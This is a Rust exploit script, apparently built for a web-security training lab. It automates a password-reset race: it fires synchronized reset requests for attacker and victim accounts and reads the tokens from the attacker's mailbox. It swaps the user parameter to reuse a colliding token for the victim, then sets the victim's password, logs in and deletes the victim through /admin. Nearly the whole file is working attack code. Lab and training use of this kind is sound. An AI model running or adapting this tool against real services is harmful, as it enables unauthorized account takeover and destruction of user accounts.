#!/usr/bin/env rust-script
//! name: reset_collide
//! description: Time-bucket reset-token collision driver with takeover - fires interleaved victim/attacker password-reset POSTs as one synchronized burst (parallel warmed connections), reads the newest emailed tokens for the attacker mailbox from the lab email client, presents each for the victim (user-parameter swap) and, on acceptance, finishes the takeover: sets the victim password, logs in, and deletes the victim through /admin. Built for labs whose reset token is derived from a coarse time value rather than from per-request randomness.
//! version: 1.0.1
//! args: <base-url> [--me user] [--victim victim] [--my-password peter] [--new-password Hacked123!] [--inbox URL] [--attempts N] [--burst N] [--csrf TOK] [--jar PATH] [--settle-ms N] [--timeout-ms N] [--selftest]
//! keywords: 时间敏感, reset token, 口令重置, 单包竞速, 时间桶碰撞, race conditions 族, 账户接管
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! ```
use pi_rust_lib::serde_json::{json, Value};
use std::collections::BTreeMap;
use std::sync::{Arc, Barrier, Mutex};
use std::time::{Duration, Instant};

type Jar = Arc<Mutex<BTreeMap<String, String>>>;

struct Cfg {
    base: String,
    me: String,
    victim: String,
    my_password: String,
    new_password: String,
    inbox: String,
    attempts: usize,
    burst: usize,
    csrf: String,
    settle_ms: u64,
    timeout_ms: u64,
}

fn arg(a: &[String], i: usize) -> String {
    a.get(i).cloned().unwrap_or_default()
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }
    let mut cfg = Cfg {
        base: String::new(),
        me: "user".into(),
        victim: "victim".into(),
        my_password: "peter".into(),
        new_password: "Hacked123!".into(),
        inbox: String::new(),
        attempts: 8,
        burst: 6,
        csrf: String::new(),
        settle_ms: 900,
        timeout_ms: 15_000,
    };
    let mut jar_path = String::new();
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--me" => { i += 1; cfg.me = arg(&args, i); }
            "--victim" => { i += 1; cfg.victim = arg(&args, i); }
            "--my-password" => { i += 1; cfg.my_password = arg(&args, i); }
            "--new-password" => { i += 1; cfg.new_password = arg(&args, i); }
            "--inbox" => { i += 1; cfg.inbox = arg(&args, i); }
            "--attempts" => { i += 1; cfg.attempts = arg(&args, i).parse().unwrap_or(8); }
            "--burst" => { i += 1; cfg.burst = arg(&args, i).parse().unwrap_or(6).max(2); }
            "--csrf" => { i += 1; cfg.csrf = arg(&args, i); }
            "--jar" => { i += 1; jar_path = arg(&args, i); }
            "--settle-ms" => { i += 1; cfg.settle_ms = arg(&args, i).parse().unwrap_or(900); }
            "--timeout-ms" => { i += 1; cfg.timeout_ms = arg(&args, i).parse().unwrap_or(15_000); }
            other if !other.starts_with("--") && cfg.base.is_empty() => cfg.base = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if cfg.base.is_empty() {
        pi_rust_lib::report::failure(
            "reset_collide",
            "need <base-url>",
            "usage: reset_collide https://lab/ [--me user] [--victim victim] [--attempts 8] [--burst 6]",
        );
        return;
    }
    cfg.base = cfg.base.trim_end_matches('/').to_string();
    let jar: Jar = Arc::new(Mutex::new(BTreeMap::new()));
    if !jar_path.is_empty() {
        if let Ok(raw) = std::fs::read_to_string(&jar_path) {
            if let Ok(v) = pi_rust_lib::serde_json::from_str::<Value>(&raw) {
                if let Some(obj) = v.as_object() {
                    if let Some(inner) = obj.values().next().and_then(|h| h.as_object()) {
                        let mut j = jar.lock().unwrap();
                        for (k, val) in inner {
                            j.insert(k.clone(), val.as_str().unwrap_or("").to_string());
                        }
                    }
                }
            }
        }
    }
    let agent = ureq::AgentBuilder::new()
        .timeout(Duration::from_millis(cfg.timeout_ms))
        .build();

    // 1) 取 csrf 与邮箱客户端地址
    let (status, body) = get(&agent, &jar, &format!("{}/forgot-password", cfg.base));
    let csrf = if cfg.csrf.is_empty() {
        extract_csrf(&body).unwrap_or_default()
    } else {
        cfg.csrf.clone()
    };
    if cfg.inbox.is_empty() {
        cfg.inbox = extract_exploit_link(&body).unwrap_or_default();
    }
    let notes: Vec<Value> = vec![json!({
        "stage": "recon", "status": status, "csrf": csrf.clone(),
        "inbox": cfg.inbox.clone(), "has_csrf": !csrf.is_empty(),
    })];
    if csrf.is_empty() {
        pi_rust_lib::report::failure(
            "reset_collide",
            "could not read the forgot-password csrf",
            "check the base url / that the instance is up",
        );
        return;
    }

    let mut winner: Option<Value> = None;
    let mut attempt_rows: Vec<Value> = Vec::new();
    let start = Instant::now();
    for attempt in 1..=cfg.attempts {
        // 2) 交错齐发:偶数位打自己,奇数位打受害者,同一屏障放行
        let t0 = Instant::now();
        let barrier = Arc::new(Barrier::new(cfg.burst));
        let mut handles = Vec::new();
        for k in 0..cfg.burst {
            let user = if k % 2 == 0 { cfg.me.clone() } else { cfg.victim.clone() };
            let body = format!("csrf={}&username={}", csrf, user);
            let agent = agent.clone();
            let jar = jar.clone();
            let base = cfg.base.clone();
            let barrier = barrier.clone();
            handles.push(std::thread::spawn(move || {
                barrier.wait();
                let (st, _) = post(
                    &agent,
                    &jar,
                    &format!("{}/forgot-password", base),
                    &body,
                );
                st
            }));
        }
        let statuses: Vec<u32> = handles.into_iter().filter_map(|h| h.join().ok()).collect();
        let fire_ms = t0.elapsed().as_millis() as u64;
        std::thread::sleep(Duration::from_millis(cfg.settle_ms));

        // 3) 读自己邮箱的最新令牌
        let (ist, ibody) = get(&agent, &jar, &cfg.inbox);
        let tokens = extract_tokens(&ibody);
        let sent = extract_first_sent(&ibody);
        let mine = (cfg.burst / 2).max(1).min(4);
        let candidates: Vec<String> = tokens.iter().take(mine).cloned().collect();

        // 4) 逐个令牌打受害者(user 参数换成受害者)
        let mut accepted: Option<(String, u32)> = None;
        let mut tried: Vec<Value> = Vec::new();
        for tok in &candidates {
            let url = format!("{}/forgot-password?user={}&token={}", cfg.base, cfg.victim, tok);
            let (st, body) = get(&agent, &jar, &url);
            tried.push(json!({"token": tok, "status": st, "body_head": head(&body, 60)}));
            if st == 200 {
                accepted = Some((tok.clone(), st));
                break;
            }
        }
        attempt_rows.push(json!({
            "attempt": attempt, "burst_statuses": statuses, "fire_ms": fire_ms,
            "inbox_status": ist, "inbox_sent": sent, "tokens_seen": tokens.len(),
            "candidates": candidates, "presented": tried,
            "accepted": accepted.as_ref().map(|(t, _)| t.clone()),
        }));
        if let Some((tok, _)) = accepted {
            winner = Some(json!({"token": tok, "attempt": attempt, "inbox_sent": sent}));
            break;
        }
    }

    if winner.is_none() {
        let data = json!({
            "notes": notes, "attempts": attempt_rows, "winner": Value::Null,
            "elapsed_ms": start.elapsed().as_millis() as u64,
        });
        pi_rust_lib::report::success(
            "reset_collide",
            data,
            "no accepted cross-user token in these attempts: raise --attempts/--burst, or the token is user-bound and needs prediction instead of collision",
        )
        .expect("report");
        return;
    }

    // 5) 接管:改密 -> 登录 -> /admin 删人
    let winner = winner.unwrap();
    let tok = winner["token"].as_str().unwrap_or("").to_string();
    let take_start = Instant::now();
    // 5a) 打开受害者重置页(取页面上的 csrf)
    let reset_url = format!("{}/forgot-password?user={}&token={}", cfg.base, cfg.victim, tok);
    let (rst, rpage) = get(&agent, &jar, &reset_url);
    let rcsrf = extract_csrf(&rpage).unwrap_or_else(|| csrf.clone());
    // 5b) 提交新口令
    let set_body = format!(
        "csrf={}&user={}&token={}&new-password-1={}&new-password-2={}",
        rcsrf, cfg.victim, tok, cfg.new_password, cfg.new_password
    );
    let (sst, sbody) = post(&agent, &jar, &format!("{}/forgot-password", cfg.base), &set_body);
    // 5c) 登录受害者
    let (lst0, lpage) = get(&agent, &jar, &format!("{}/login", cfg.base));
    let lcsrf = extract_csrf(&lpage).unwrap_or_default();
    let login_body = format!(
        "csrf={}&username={}&password={}",
        lcsrf, cfg.victim, cfg.new_password
    );
    let (lst, lbody) = post(&agent, &jar, &format!("{}/login", cfg.base), &login_body);
    let (mst, mbody) = get(&agent, &jar, &format!("{}/my-account", cfg.base));
    let logged_in = mbody.contains("Log out") || mbody.contains("logout") || mbody.contains(&cfg.victim);
    // 5d) 管理面删人
    let (ast, apage) = get(&agent, &jar, &format!("{}/admin", cfg.base));
    let acsrf = extract_csrf(&apage).unwrap_or_default();
    let (dst, dbody) = if ast == 200 && !acsrf.is_empty() {
        post(
            &agent,
            &jar,
            &format!("{}/admin/delete", cfg.base),
            &format!("csrf={}&username={}", acsrf, cfg.victim),
        )
    } else {
        (0, String::new())
    };
    let data = json!({
        "notes": notes, "attempts": attempt_rows, "winner": winner,
        "takeover": {
            "reset_page_status": rst, "set_password_status": sst,
            "set_password_head": head(&sbody, 120),
            "login_page_status": lst0, "login_status": lst, "login_head": head(&lbody, 120),
            "my_account_status": mst, "logged_in": logged_in,
            "admin_status": ast, "admin_csrf": !acsrf.is_empty(),
            "delete_status": dst, "delete_head": head(&dbody, 120),
        },
        "elapsed_ms": start.elapsed().as_millis() as u64,
        "takeover_ms": take_start.elapsed().as_millis() as u64,
    });
    pi_rust_lib::report::success(
        "reset_collide",
        data,
        "confirm the lab banner via banner_verdict (solved flag) after the admin delete",
    )
    .expect("report");
}

fn head(s: &str, n: usize) -> String {
    s.chars().take(n).collect()
}

fn cookie_header(jar: &Jar) -> Option<String> {
    let j = jar.lock().unwrap();
    if j.is_empty() {
        return None;
    }
    Some(
        j.iter()
            .map(|(k, v)| format!("{}={}", k, v))
            .collect::<Vec<_>>()
            .join("; "),
    )
}

fn absorb_cookies(jar: &Jar, resp: &ureq::Response) {
    let mut j = jar.lock().unwrap();
    for val in resp.all("set-cookie") {
        if let Some((pair, _)) = val.split_once(';') {
            if let Some((name, value)) = pair.split_once('=') {
                j.insert(name.trim().to_string(), value.trim().to_string());
            }
        }
    }
}

fn get(agent: &ureq::Agent, jar: &Jar, url: &str) -> (u32, String) {
    let mut req = agent.get(url);
    if let Some(c) = cookie_header(jar) {
        req = req.set("Cookie", &c);
    }
    match req.call() {
        Ok(resp) => {
            let st = resp.status() as u32;
            absorb_cookies(jar, &resp);
            (st, resp.into_string().unwrap_or_default())
        }
        Err(ureq::Error::Status(st, resp)) => (st as u32, resp.into_string().unwrap_or_default()),
        Err(_) => (0, String::new()),
    }
}

fn post(agent: &ureq::Agent, jar: &Jar, url: &str, body: &str) -> (u32, String) {
    let mut req = agent
        .post(url)
        .set("Content-Type", "application/x-www-form-urlencoded");
    if let Some(c) = cookie_header(jar) {
        req = req.set("Cookie", &c);
    }
    match req.send_string(body) {
        Ok(resp) => {
            let st = resp.status() as u32;
            absorb_cookies(jar, &resp);
            (st, resp.into_string().unwrap_or_default())
        }
        Err(ureq::Error::Status(st, resp)) => (st as u32, resp.into_string().unwrap_or_default()),
        Err(_) => (0, String::new()),
    }
}

fn extract_csrf(html: &str) -> Option<String> {
    for marker in ["name=\"csrf\"", "name='csrf'"] {
        if let Some(pos) = html.find(marker) {
            let tail = &html[pos..];
            if let Some(vpos) = tail.find("value=") {
                let rest = &tail[vpos + 6..];
                let quote = rest.chars().next()?;
                if quote == '"' || quote == '\'' {
                    let end = rest[1..].find(quote)?;
                    return Some(rest[1..1 + end].to_string());
                }
            }
        }
    }
    None
}

fn extract_exploit_link(html: &str) -> Option<String> {
    let idx = html.find("exploit-server.net/email")?;
    let start = html[..idx].rfind('\'')? + 1;
    Some(html[start..idx + "exploit-server.net/email".len()].to_string())
}

fn extract_tokens(html: &str) -> Vec<String> {
    let mut out = Vec::new();
    let bytes = html.as_bytes();
    let mut i = 0;
    while i + 6 < bytes.len() {
        if &html[i..i + 6] == "token=" {
            let s = i + 6;
            let e = s + 40;
            if e <= bytes.len() {
                let cand = &html[s..e];
                if cand.chars().all(|c| c.is_ascii_hexdigit()) && !cand.chars().all(|c| c.is_ascii_digit())
                {
                    let owned = cand.to_string();
                    if !out.contains(&owned) {
                        out.push(owned);
                    }
                }
            }
            i = e;
        } else {
            i += 1;
        }
    }
    out
}

fn extract_first_sent(html: &str) -> String {
    if let Some(pos) = html.find("2026-") {
        html[pos..pos + 19].to_string()
    } else {
        String::new()
    }
}

fn selftest() {
    let page = "<form><input required type=\"hidden\" name=\"csrf\" value=\"3tj1vpq6waFKwGicXKWLTxbcxFoC5D04\">";
    assert_eq!(extract_csrf(page).unwrap(), "3tj1vpq6waFKwGicXKWLTxbcxFoC5D04");
    let mail = "<a href='https://lab/forgot-password?user=user&token=c1008e80d203ed92f51998bc401f00c6da1592f8'>x</a><td>2026-10-10 01:30:06 +0000</td>";
    let toks = extract_tokens(mail);
    assert_eq!(toks.len(), 1);
    assert_eq!(toks[0], "c1008e80d203ed92f51998bc401f00c6da1592f8");
    assert_eq!(extract_first_sent(mail), "2026-10-10 01:30:06");
    let hdr = "<a id='exploit-link' class='button' target='_blank' href='https://exploit-0a8c00be03e898198073c09c0149006f.exploit-server.net/email'>Email client</a>";
    assert_eq!(
        extract_exploit_link(hdr).unwrap(),
        "https://exploit-0a8c00be03e898198073c09c0149006f.exploit-server.net/email"
    );
    assert!(head("abcdef", 3) == "abc");
    pi_rust_lib::report::success(
        "reset_collide",
        json!({"selftest": "ok", "checks": ["csrf", "tokens", "sent", "exploit-link", "head"]}),
        "run: reset_collide https://lab/ --me user --victim victim",
    )
    .expect("report");
}
